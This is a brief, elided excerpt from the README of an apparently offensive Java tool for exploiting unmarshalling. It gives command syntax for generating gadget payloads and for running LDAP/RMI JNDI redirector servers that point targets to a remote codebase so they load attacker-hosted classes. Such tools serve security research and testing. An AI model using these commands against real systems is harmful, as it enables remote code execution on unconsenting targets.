...
Full paper is at [farahsec.pdf](https://www.github.com/mbechler/farahsec/blob/master/farahsec.pdf?raw=true)
...
```shell
java -cp target/farahsec-0.0.1-SNAPSHOT-all.jar farahsec.<Marshaller> [-a] [-v] [-t] [<gadget_type> [<arguments...>]]
```
...
* Run a JNDI reference redirector service pointing to that codebase -
  two implementations are included: *farahsec.jndi.LDAPRefServer* and *RMIRefServer*.

      ```java -cp target/farahsec-0.0.1-SNAPSHOT-all.jar farahsec.jndi.(LDAP|RMI)RefServer <codebase>#<class> [<port>]```
